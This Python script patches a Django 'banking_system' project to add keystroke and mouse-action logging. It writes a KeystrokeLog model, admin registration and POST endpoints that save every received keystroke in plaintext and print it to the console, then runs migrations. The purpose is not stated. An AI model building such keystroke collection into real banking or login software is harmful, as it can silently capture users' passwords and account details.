import os
import json

# Paths to the Django project's files
BASE_DIR = "/home/mutabazi/Documents/Users/festusedward-n/Backup for the project/26th November 2024 Backup/banking_system/"
VIEW_FILE = os.path.join(BASE_DIR, "logger/views.py")
MODEL_FILE = os.path.join(BASE_DIR, "logger/models.py")
ADMIN_FILE = os.path.join(BASE_DIR, "logger/admin.py")

def update_models():
    """Ensure the KeystrokeLog model exists in models.py."""
    keystroke_log_model = """
from django.db import models

class KeystrokeLog(models.Model):
    key = models.CharField(max_length=10)
    timestamp = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return self.key
"""
    with open(MODEL_FILE, 'r+') as file:
        content = file.read()
        if 'class KeystrokeLog' not in content:
            file.write(keystroke_log_model)
            print(f"Added KeystrokeLog model to {MODEL_FILE}")
        else:
            print(f"{MODEL_FILE} already includes KeystrokeLog model.")

def update_admin():
    """Ensure KeystrokeLog is registered in admin.py."""
    keystroke_log_admin = """
from django.contrib import admin
from .models import KeystrokeLog

admin.site.register(KeystrokeLog)
"""
    with open(ADMIN_FILE, 'r+') as file:
        content = file.read()
        if 'admin.site.register(KeystrokeLog)' not in content:
            file.write(keystroke_log_admin)
            print(f"Added KeystrokeLog registration to {ADMIN_FILE}")
        else:
            print(f"{ADMIN_FILE} already includes KeystrokeLog registration.")

def update_views():
    """Update views.py to include keystroke and mouse action handlers."""
    with open(VIEW_FILE, 'r+') as file:
        content = file.read()
        if 'def log_keystroke' not in content:
            file.write("""
import json
from django.http import JsonResponse
from .models import KeystrokeLog

def log_keystroke(request):
    if request.method == "POST":
        try:
            data = json.loads(request.body)
            keystrokes = data.get('data')
            for keystroke in keystrokes:
                key = keystroke.get('key')
                if key:
                    KeystrokeLog.objects.create(key=key)
            print(f"Keystrokes received: {keystrokes}")
            return JsonResponse({"status": "success", "message": "Keystrokes logged successfully"}, status=201)
        except json.JSONDecodeError:
            return JsonResponse({"status": "error", "message": "Invalid JSON data"}, status=400)
        except Exception as e:
            return JsonResponse({"status": "error", "message": str(e)}, status=500)
    else:
        return JsonResponse({"status": "error", "message": "Invalid request method"}, status=405)
""")
        if 'def log_mouse_action' not in content:
            file.write("""
def log_mouse_action(request):
    if request.method == "POST":
        try:
            data = json.loads(request.body)
            action = data.get("action")
            coordinates = data.get("coordinates")
            print(f"Mouse action: {action}, Coordinates: {coordinates}")
            return JsonResponse({"status": "success", "message": "Mouse action logged successfully"}, status=201)
        except json.JSONDecodeError:
            return JsonResponse({"status": "error", "message": "Invalid JSON data"}, status=400)
        except Exception as e:
            return JsonResponse({"status": "error", "message": str(e)}, status=500)
    else:
        return JsonResponse({"status": "error", "message": "Invalid request method"}, status=405)
""")
        print(f"Updated {VIEW_FILE} to handle keystroke and mouse logging.")

def apply_migrations():
    """Run Django migrations to apply model changes."""
    os.system(f"python3 {BASE_DIR}/manage.py makemigrations logger")
    os.system(f"python3 {BASE_DIR}/manage.py migrate")
    print("Migrations applied.")

if __name__ == "__main__":
    print("Starting automation for keystroke and mouse action logging...")
    
    update_models()
    update_views()
    update_admin()
    
    print("Applying migrations...")
    apply_migrations()
    
    print("Automation completed. Keystroke and mouse action logging setup is now active.")

